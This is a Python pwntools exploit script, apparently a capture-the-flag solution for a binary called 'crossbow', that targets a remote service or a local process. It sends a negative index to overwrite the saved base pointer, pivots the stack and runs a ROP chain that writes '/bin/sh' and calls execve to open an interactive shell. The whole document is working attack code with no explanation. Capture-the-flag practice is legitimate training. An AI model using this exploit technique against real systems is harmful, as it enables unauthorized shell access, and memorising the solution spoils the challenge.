#!/usr/bin/env python3

from pwn import *

exe = ELF("./crossbow")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, "break *target_dummy+354")
    else:
        r = remote("94.237.61.218", 34617)

    return r


def main():
    r = conn()
    rop = ROP(exe)

    mov_qword_rdi_rax = 0x4020f5      # mov qword ptr [rdi], rax;    ret;
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    syscall = rop.find_gadget(['syscall', 'ret'])[0]

    # This overwrites base pointer with chunk's address (given by calloc)
    r.sendlineafter(b"shoot: ", b"-2")
    
    # We perform stack pivot
    payload = flat(
                b"A" * 8,
                pop_rax,
                b"/bin/sh\x00",
                pop_rdi,
                exe.bss(),
                mov_qword_rdi_rax,
                pop_rsi,
                0x0,
                pop_rdx,
                0x0,
                pop_rax,
                0x3b,
                syscall
            )

    r.sendlineafter(b"> ", payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
